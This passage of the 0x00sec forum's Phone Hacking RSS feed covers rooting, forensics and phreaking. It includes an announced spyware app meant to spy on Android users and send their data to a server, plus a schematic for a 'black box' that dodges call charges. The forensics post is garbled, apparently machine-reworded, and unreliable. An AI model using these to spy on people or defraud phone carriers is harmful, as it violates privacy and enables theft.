+          <source url="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-1-collecting-installed-android-apps/7121.rss">Building a God’s Eye Android App: Part 1 - Collecting Installed Android Apps</source>
+        </item>
+        <item>
+          <title>Building a God&#39;s Eye Android App: Part 0 - Introduction to Amunet</title>
+          <dc:creator><![CDATA[sergeantsploit]]></dc:creator>
+          <category>Phone Hacking</category>
+          <description><![CDATA[
+            <p>Greetings from space,</p>
+<p>It’s great to post once in a while and help share knowledge. This series is an android series. We will develop spying features into our app. I’m naming the app <strong>AMUNET</strong> but you are free to of course name it as you please. The idea originated from the God’s Eye hacking program in Fast and Furious movie where it could locate and also hack into anything within its reach. In this series, we take a step by step in developing an android app that will use ( abuse ) android os functionalities to spy on the users and also maybe control the phone.</p>
+<p><strong>DISCLAIMER</strong></p>
+<p>I am by no means responsible for what you use the codes or knowledge learnt from this development series in any form. This series is purely an education series on the android system.</p>
+<p><strong>WHAT THIS SERIES IS NOT</strong></p>
+<ul>
+<li>
+<p>This series will not help or teach anyone how to deploy / hack into android phones to install the app. Since it’s educational, you are required to test and use it on your own devices. The app will be uninstalled and installed repeatedly as new permissions and features are added so don’t think this is a kali hacking android tutorial.</p>
+</li>
+<li>
+<p>The basic installation and setting up of Android Studio will not be covered. I assume you already have it installed and setup. If not, there are a lot more tutorials out there created about Android Studio installation than the total tutorials here combined ( <img src="https://0x00sec.org/images/emoji/twitter/thinking.png?v=9" title=":thinking:" class="emoji" alt=":thinking:"> )</p>
+</li>
+</ul>
+<p><strong>INTRODUCTION TO AMUNET</strong></p>
+<p>There is no finished android app or source code that I’ll be looking upon to build this series so I don’t expect anyone to pm asking for source code for the entire series. In fact, this app doesn’t exist yet and we will all together develop it. Therefore, at the end of every post, you are allowed to share opinions, corrections and even better code improvement since I don’t know it all and eager to learn ( began android dev not long ago ).</p>
+<p><strong>INTERNALS OF AMUNET</strong></p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/7/7b5f6279c687d3f2164c93bcea653762c64b128c.jpg" alt="gods%20eye" data-base62-sha1="hBp5ylka3tv57AIih9F7fbiR48Q" width="690" height="459"></p>
+<p>The app will communicate to an external server where all the information gathered will be sent. We will develop both Web UI ( HTML CSS Bootstrap, Javascript ) and Android ( Java ) UI so it’s going to be a very long series.</p>
+<p>So I will end it here. This post is just to create awareness of the upcoming posts. I will like to have your votes, comments, opinions and how you think the app should look like, structure and communication techniques.</p>
+<p><a href="https://0x00sec.org/t/building-a-gods-eye-android-app-part-0-introduction-to-amunet/7112/1">Click to view the poll.</a></p>
+<p><strong><span class="hashtag">#Sergeant</span></strong></p>
+            <p><small>4 posts - 2 participants</small></p>
+            <p><a href="https://0x00sec.org/t/building-a-gods-eye-android-app-part-0-introduction-to-amunet/7112">Read full topic</a></p>
+          ]]></description>
+          <link>https://0x00sec.org/t/building-a-gods-eye-android-app-part-0-introduction-to-amunet/7112</link>
+          <pubDate>Thu, 14 Jun 2018 17:15:55 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">0x00sec.org-topic-7112</guid>
+          <source url="https://0x00sec.org/t/building-a-gods-eye-android-app-part-0-introduction-to-amunet/7112.rss">Building a God&#39;s Eye Android App: Part 0 - Introduction to Amunet</source>
+        </item>
+        <item>
+          <title>Hacking Motorola Moto E4 and Installing Resurrection Remix OS (unofficial version)</title>
+          <dc:creator><![CDATA[Techno_Forg]]></dc:creator>
+          <category>Phone Hacking</category>
+          <description><![CDATA[
+            <p><strong>Warning: This is a really long and boring post</strong></p>
+<p>#<span class="hashtag">#Introduction:</span></p>
+<p>Most of my time has been dedicated to getting a new smart phone that’s both affordable and also well, unlockable and also rootable (I’ve concluded if it’s unlockable, it’s rootable, but I could be wrong). Anyways, after much searching I settled on the Moto E4. The version I got came unlocked at Walmart and is a beauty except one thing, the internal storage, but I’m also working on getting a micro SD card. The specs are as follows:</p>
+<p><span class="hashtag">#Specs:</span></p>
+<p>Internal Storage: 16 gb (micro SD card capabilities)</p>
+<p>RAM: 2 GB</p>
+<p>(supports up to 128 GB)</p>
+<p>Battery: 2800mAh Li-ion (removable)</p>
+<p>Processor: Quad Core Snapdragon 427 (1.4 GHz)</p>
+<p>Android Version: Nougat</p>
+<p>The specs are decent and the price wasn’t bad, was around $129.99, but I got a discount of 10% off purchase, family member works at Walmart, but anyways, once I got my phone I immediately went to rooting it/screwed up the main OS (don’t ask, but I accidentally deleted the OS). I kind of deleted the OS after installing TWRP, but I got a lightbulb. Ok, so, I deleted the main OS, but I knew the existence of alternative Android Operating Systems. After much searching, I settled on Resurrection Remix OS (unofficial version), but first I shall introduce how to install TWRP on the Moto E4.</p>
+<p>#<span class="hashtag">#Installing</span> TWRP:</p>
+<p>Requirements:</p>
+<ul>
+<li>Unlocked Bootloader</li>
+<li>TWRP image</li>
+<li>ADB</li>
+<li>Moto e4</li>
+<li>A brain (please)</li>
+</ul>
+<p>The first step is unlocking the bootloader (obviously).</p>
+<p>First off though, before yall do anything, go to Settings -&gt; About Phone -&gt; Tap on Build Number seven times. This’ll enable Developer on your phone. After obtaining Developer. Go to Settings -&gt; Developer Options -&gt; enable OEM Unlock and also enable USB Debugging.</p>
+<p>Now this is the fun part (ish). We shall boot into the bootloader/fastboot (whatever it’s called) using Android Developer Bridge (ADB). First plug in your phone using a USB cable, I usually use the USB cable that it comes with and in a terminal, I’m assuming it’s Linux:</p>
+<p><code>adb devices </code></p>
+<p>Your device should show up… if not, double check that USB debugging is set to: Use device as MIDI and run the command again.</p>
+<p>Now that our device is recognized by ADB, we shall boot into bootloader. You could use the key combinations, but in that same terminal type:</p>
+<p><code>adb reboot bootloader </code></p>
+<p>Your Moto should reboot to bootloader… should as in, if you do everything up to now, your phone should be in bootloader. Now type in:</p>
+<p><code>fastboot devices </code></p>
+<p>Again, your device should show up.</p>
+<p>After fastboot recognizes your device… it’s time to get the unlock code for OEM. Type in:</p>
+<p><code>fasboot oem get_unlock_data </code></p>
+<p>Once you get your OEM unlock data, navigate to the <a href="https://accounts.motorola.com/ssoauth/login?TARGET=https://motorola-global-portal.custhelp.com/cc/cas/sso/redirect/standalone%2Fbootloader%2Funlock-your-device-b" rel="nofollow noopener">Motorola</a> official website, and create a account and follow the directions on there, copy and paste your OEM unlock data from the terminal, line by line and hit the submit button. If successful your new key should be emailed to you. Once you get your key, type in:</p>
+<p><code>fastboot oem unlock (key) </code></p>
+<p>That’s it! Your phone is unlocked… Now we can get to installing TWRP.</p>
+<p>TWRP is a custom recovery that’ll allow us to flash ROMs.</p>
+<p>First step is of course to download <a href="http://www.mediafire.com/file/dnsm6jwdtzopyfw/twrp-perry-3.1.1-r1.img" rel="nofollow noopener">TWRP</a>. Once downloaded, save it to your desktop or wherever you wish. Now still in bootloader/fastboot, type in:</p>
+<p><code>fastboot flash recovery (twrp image) </code></p>
+<p>Once it is done flashing, in bootloader press the up arrow key till you see Recovery option. Hit the power key in order to boot into your new recovery. Now we shall flash <a href="https://androidfilehost.com/?w=files&amp;flid=223811" rel="nofollow noopener">Recovery Remix OS</a> and also <a href="https://www.getdroidtips.com/download-install-gapps-cm14-cm14-1-roms/" rel="nofollow noopener">Gapps</a> (Google Apps, kek). Save the files to your storage (I prefer micro sd card, but internal is just as good). In TWRP Recovery, tap on Install and navigate to where you saved Ressurection Remix OS and swipe on the bottom to flash the ROM. Once done do the same thing to Gapps since you’ll need Google Apps to do anything, unless you know how to work without Gapps.</p>
+<p>Once done flashing, press back and hit Reboot -&gt; Bootloader and once booted into Bootloader, press power button (the option you’ve booted into is Start which is what you’ll need to boot into your new OS, don’t ask me why this is so, I have no idea and still researching this “issue” because without booting into bootloader and selecting start, you will boot into TWRP).</p>
+<p>That’s it! Enjoy your new OS.</p>
+<p>I do apologize if this was long, but I did my best.</p>
+<p>~Cheers!</p>
+            <p><small>6 posts - 4 participants</small></p>
+            <p><a href="https://0x00sec.org/t/hacking-motorola-moto-e4-and-installing-resurrection-remix-os-unofficial-version/4182">Read full topic</a></p>
+          ]]></description>
+          <link>https://0x00sec.org/t/hacking-motorola-moto-e4-and-installing-resurrection-remix-os-unofficial-version/4182</link>
+          <pubDate>Sun, 05 Nov 2017 14:07:47 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">0x00sec.org-topic-4182</guid>
+          <source url="https://0x00sec.org/t/hacking-motorola-moto-e4-and-installing-resurrection-remix-os-unofficial-version/4182.rss">Hacking Motorola Moto E4 and Installing Resurrection Remix OS (unofficial version)</source>
+        </item>
+        <item>
+          <title>Early, unregulated phone access</title>
+          <dc:creator><![CDATA[fraq]]></dc:creator>
+          <category>Phone Hacking</category>
+          <description><![CDATA[
+            <p>Way back in the day (about 1902, actually) ranches in rural Texas had a rather ingenious way of calling each other on the telephone: They used their barbed wire.</p>
+<p>Anyone who has ever played with a POTS (Plain Old Telephone System) phone probably knows that a phone is little more than a 2-wire circuit. What happens when you send current through hundreds of miles of connected barbed wires? Ad-hoc telephone networks!</p>
+<p>This is an excellent read, highly recommended.</p>
+<p><a href="http://www.texasescapes.com/CFEckhardt/Rural-Telephone-Systems-in-the-West.htm" class="onebox" target="_blank" rel="nofollow noopener">http://www.texasescapes.com/CFEckhardt/Rural-Telephone-Systems-in-the-West.htm</a></p>
+            <p><small>16 posts - 6 participants</small></p>
+            <p><a href="https://0x00sec.org/t/early-unregulated-phone-access/3480">Read full topic</a></p>
+          ]]></description>
+          <link>https://0x00sec.org/t/early-unregulated-phone-access/3480</link>
+          <pubDate>Mon, 04 Sep 2017 23:11:44 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">0x00sec.org-topic-3480</guid>
+          <source url="https://0x00sec.org/t/early-unregulated-phone-access/3480.rss">Early, unregulated phone access</source>
+        </item>
+        <item>
+          <title>[Android] UnlockWatch - mitigate phone pattern/pin guessing</title>
+          <dc:creator><![CDATA[rokups]]></dc:creator>
+          <category>Phone Hacking</category>
+          <description><![CDATA[
+            <p>Believe it or not i could not find an app which would reboot phone on certain number of failed unlock attempts. Why would anyone want this? To prevent unlocking encrypted devices of course!</p>
+<h2>My setup</h2>
+<ol>
+<li>Phone: galaxy S5 stock rom, rooted and debloated.</li>
+<li>Encrypt device.</li>
+<li>Set pattern lock.</li>
+<li>Set cryptfs password using <a href="https://play.google.com/store/apps/details?id=org.nick.cryptfs.passwdmanager" rel="nofollow noopener">Cryptfs password manager</a>
+</li>
+<li>Install and run <a href="https://github.com/rokups/UnlockWatch/releases" rel="nofollow noopener">UnlockWatch</a> once, grant permanent root and add as device administrator.</li>
+</ol>
+<h2>Result</h2>
+<p>This setup provides you with encrypted device which uses strong password on boot, and pattern (or pin if you choose so) lock to unlock device normally. Three failed pattern (or pin) entries will reboot device and you will have to enter your long and strong password. Application is using android device administrator API and does not need to run in the background. It is very light on resources and reliable. Also note that invalid attempt is counted only if invalid pattern or pin length is at least as long as minimal length enforced by OS.</p>
+<h2>Other software</h2>
+<p>While writing this post i discovered <a href="https://play.google.com/store/apps/details?id=cz.eutopia.snooperstopper" rel="nofollow noopener">SnooperStopper</a> app. It is supposed to do same thing as UnlockWatch + Cryptfs password manager, however setting password did not work on my android 6 and source code is nowhere to be seen.</p>
+<h2>The good stuff</h2>
+<p>Source code: <a href="https://github.com/rokups/UnlockWatch" rel="nofollow noopener">https://github.com/rokups/UnlockWatch</a></p>
+            <p><small>5 posts - 3 participants</small></p>
+            <p><a href="https://0x00sec.org/t/android-unlockwatch-mitigate-phone-pattern-pin-guessing/3442">Read full topic</a></p>
+          ]]></description>
+          <link>https://0x00sec.org/t/android-unlockwatch-mitigate-phone-pattern-pin-guessing/3442</link>
+          <pubDate>Wed, 30 Aug 2017 09:44:10 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>No</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">0x00sec.org-topic-3442</guid>
+          <source url="https://0x00sec.org/t/android-unlockwatch-mitigate-phone-pattern-pin-guessing/3442.rss">[Android] UnlockWatch - mitigate phone pattern/pin guessing</source>
+        </item>
+        <item>
+          <title>How to master Android Forensics?</title>
+          <dc:creator><![CDATA[burhanudinn123]]></dc:creator>
+          <category>Phone Hacking</category>
+          <description><![CDATA[
+            <p>AFLogical is another methodology that extracts robot devices’ information besides adb. Content suppliers ar employed in this method, saving the extracted information into the device’s American state card. Such information contains contacts, call logs, SMS, transmission <a href="http://infosecaddicts.com/" rel="nofollow noopener">electronic</a> communication Service (MMS), MMS parts, and device data.</p>
+<p>Open the terminal window within Santoku. Then, sort the command “aflogical-ose”, wherever “OSE” abreviates Open supply Edition.<br>
+Next, sort the foundation word. If the word is correct, pressing Enter through your computer’s keyboard can pull /sdcard/forensics into ~/aflogical-data/<br>
+Pull/sdcard/forensics into ~/aflogical/data/<br>
+Select the specified information for extraction before eventually pressing “Capture” then “Ok” to substantiate the completion of knowledge extraction.<br>
+In order to continue, press Enter victimization your computer’s keyboard.</p>
+<p>Now, the placement of ~/aflogical-data has the force information from SDCard. All the force information that ar recovered are going to be saved into that location from the someone.<br>
+In order to substantiate the higher than, simply open a terminal window to sort the subsequent command within it: “cd ~/aflogical-data/” for the sake of fixing the directory wherever the work is currently thereto location. succeeding step is to sort “ls” for the sake of viewing the created file.<br>
+cd ~/aflogical-data/<br>
+ls<br>
+the following can show<br>
+20160213.0649<br>
+One will currently merely browse any extracted pictures –or files or information –. All such files containing contacts, call logs, MMS/SMS, associated device data are going to be having an extension of .csv</p>
+<p>One may simply read the aforesaid SMS table, showing all SMS.<br>
+Note that SQLite informationbases ar the foremost common means that of storing such valuable info or data. Throughout the terribly following lines, i’ll mention the file name and therefore the path that stores some proof.<br>
+a. \data\data\com.android.providers.contacts\ databases contacts2.db is wherever the phone book principally resides<br>
+We may simply extract such info as an example through harnessing “adb pull” command.<br>
+Adb pull<br>
+/data/data/com.android.providers.contacts/databases/contacts2.db/home/infosec/ContactDB/contacts.db<br>
+In genereal, one may browse SQLite by creating use of the Sqliteman utility. A command of “sqliteman” followed by the trail wherever the info resides then eventually the name of info.db.<br>
+Sqliteman /home/infosec/ContactDB/contacts.db<br>
+There ar twenty tables within such info like _sync_state and calls.<br>
+Calls history or maybe the other valuable information might be merely be got when querying a particular table in a very info. One will accomplish this through succeeding command: “select * from calls) for example.</p>
+            <p><small>2 posts - 2 participants</small></p>
+            <p><a href="https://0x00sec.org/t/how-to-master-android-forensics/3328">Read full topic</a></p>
+          ]]></description>
+          <link>https://0x00sec.org/t/how-to-master-android-forensics/3328</link>
+          <pubDate>Wed, 16 Aug 2017 19:37:47 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>No</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">0x00sec.org-topic-3328</guid>
+          <source url="https://0x00sec.org/t/how-to-master-android-forensics/3328.rss">How to master Android Forensics?</source>
+        </item>
+        <item>
+          <title>About the Phone Hacking category</title>
+          <dc:creator><![CDATA[pry0cc]]></dc:creator>
+          <category>Phone Hacking</category>
+          <description><![CDATA[
+            <p>Everything from Phreaking, to Nethunter. Here you will find a treasure trove of useful articles regarding the entire Phone Hacking scene.</p>
+            <p><small>6 posts - 6 participants</small></p>
+            <p><a href="https://0x00sec.org/t/about-the-phone-hacking-category/3163">Read full topic</a></p>
+          ]]></description>
+          <link>https://0x00sec.org/t/about-the-phone-hacking-category/3163</link>
+          <pubDate>Thu, 03 Aug 2017 19:50:56 +0000</pubDate>
+          <discourse:topicPinned>Yes</discourse:topicPinned>
+          <discourse:topicClosed>No</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">0x00sec.org-topic-3163</guid>
+          <source url="https://0x00sec.org/t/about-the-phone-hacking-category/3163.rss">About the Phone Hacking category</source>
+        </item>
+        <item>
+          <title>Poll: Articles on Phones/Telephony</title>
+          <dc:creator><![CDATA[fraq]]></dc:creator>
+          <category>Phone Hacking</category>
+          <description><![CDATA[
+            <p>I didn’t do a ton of phreaking, but I do know my fair share about POTS telephony from my days in the Air Force. Would articles on analog phones and switches interest you?</p>
+<p><a href="https://0x00sec.org/t/poll-articles-on-phones-telephony/3153/1">Click to view the poll.</a></p>
+            <p><small>9 posts - 7 participants</small></p>
+            <p><a href="https://0x00sec.org/t/poll-articles-on-phones-telephony/3153">Read full topic</a></p>
+          ]]></description>
+          <link>https://0x00sec.org/t/poll-articles-on-phones-telephony/3153</link>
+          <pubDate>Wed, 02 Aug 2017 20:31:50 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">0x00sec.org-topic-3153</guid>
+          <source url="https://0x00sec.org/t/poll-articles-on-phones-telephony/3153.rss">Poll: Articles on Phones/Telephony</source>
+        </item>
+        <item>
+          <title>How to make a blackbox</title>
+          <dc:creator><![CDATA[whatskrakan_01]]></dc:creator>
+          <category>Phone Hacking</category>
+          <description><![CDATA[
+            <p>This is for Deshi, welcome to the early-mid 90s, Original txt file from <a href="http://Machacking.net" rel="nofollow noopener">Machacking.net</a></p>
+<hr>
+<h2>(&gt;Introduction&lt;)</h2>
+<p>What is a BLACK BOX? A BLACK BOX is a device that is hooked up to your phone that fixes your phone so that when you get a call, the caller doesn’t get charged for the call. This is good for calls up to 1/2 hour, after 1/2  hour the Gestapo comes (you can guess what happens)</p>
+<p>What this little beauty does is keep the line voltage from dropping  to 10v when you answer your phone. The line is instead kept at 36v and it will make the phone think that it is still ringing while your talking. The reason for the 1/2 hour time limit is that the Gestapo thinks that something is wrong after 1/2 an hour of ringing. (I mean, come on)</p>
+<h2>(&gt;Phone Modification Instructions&lt;)</h2>
+<p>All parts are available  Radio Shack. Using the least possible parts and arrangement, the cost is $0.98; and that is parts for two  of them! Talk  about a deal! If you  want  to splurge then you can get a board, and a switch.</p>
+<pre><code>                  **  Schematic 1 for most fones  **
+
+                  **         LED ON: BOX ON       **
+
+                FROM &gt;--------------------GREEN-&gt;  TO
+                LINE &gt;--!   1.8k  LED  !---RED--&gt; FONE
+                        !--/\/\/\--!&gt;--!
+                        !              !
+                        ------&gt;/&lt;-------
+                             SPST
+
+
+
+Parts:  1 1.8k 1/2 watt resistor
+        1 1.5v LED
+        1 SPST switch
+</code></pre>
+<p>*You may just have two wires which you connect together for the switch.</p>
+<pre><code>                   **  Schematic 2 for all fones  **
+                   **        LED ON: BOX OFF      **
+                 FROM &gt;---------------GREEN-&gt;  TO
+                 LINE &gt;-------      ---RED--&gt; FONE
+                             !  LED !
+                           ----&gt;/&lt;--!&gt;--
+                           !         !
+                           ---/\/\/---
+                              1.8k
+
+Parts:  1 1.8k 1/2 watt resistor
+        1 1.5v LED
+        1 DPST switch
+</code></pre>
+<p>Here is the PC board layout that I recommend using. It is neat and is very easy to hook up:</p>
+<pre><code>                  Schematic #1        Schematic #2
+
+                 **************     ****************
+                 *            *     *  -------     *
+                 * --&lt;LED&gt;--- *     *  !     !     *
+                 * !        ! *     *  ! &lt;SWITCH&gt;  *
+                 * RESISTOR ! *     *  ! !      !  *
+                 *        ! ! *     *  ! !      /  *
+                 * -------- ! *     *  ! !      \  *
+                 * !        ! *     *  ! &lt;LED&gt;! /  *
+                 * --SWITCH-- *     *  !      ! \  *
+                 *  !      !  *     *  !      ! /  *
+               L *  !      !  * F L *  !      ! !  * F
+               I&gt;RED-      -RED&gt;O I&gt;RED-      ---RED&gt;O
+               N&gt;-----GREEN----&gt;N N&gt;-----GREEN------&gt;N
+               E * h          * E E *              * E
+                 **************     ****************
+</code></pre>
+<p>Once you have hooked up all the parts, you must figure out what set of wires go to the line and which go to the fone. This is because of the fact that LED’s must be put in, in a certain direction.  Depending on which way you put the LED is what controls what wires are for the line &amp; fone. In order to find out, hook up the box in one direction using one set of wires for line and the other for phone.</p>
+<p><strong>NOTE</strong>  For Model I switch should be OFF.<br>
+<strong>NOTE</strong>  For Model ][ switch  should  be set to side connecting the LED.</p>
+<p>Once you have hooked it up, then pick up the fone and see if the LED  is on.  If it is, the LED will be lit.  If is  doesn’t light then switch the wires and try again. Once you know which are which  then label them.  NOTE: If neither directions worked then your switch was in the wrong position. Now label the switch in its current position as BOX ON.</p>
+<h2>(&gt;Black Box Usage&lt;)</h2>
+<p>The purpose of this box is not  to people  who  call you so it would make sense  that  it  can only  be  used  to receive calls.   When the box is  <em>ON</em> then you may only receive calls. Your phone will ring like normal and the  LED light on the box will flash. When you answer the fone the LED will light and the caller will not be charged. Hang up the fone after you are done like normal.</p>
+<hr>
+            <p><small>6 posts - 4 participants</small></p>
+            <p><a href="https://0x00sec.org/t/how-to-make-a-blackbox/3135">Read full topic</a></p>
+          ]]></description>
+          <link>https://0x00sec.org/t/how-to-make-a-blackbox/3135</link>
+          <pubDate>Wed, 02 Aug 2017 03:31:02 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">0x00sec.org-topic-3135</guid>
+          <source url="https://0x00sec.org/t/how-to-make-a-blackbox/3135.rss">How to make a blackbox</source>
+        </item>
+  </channel>
+</rss>
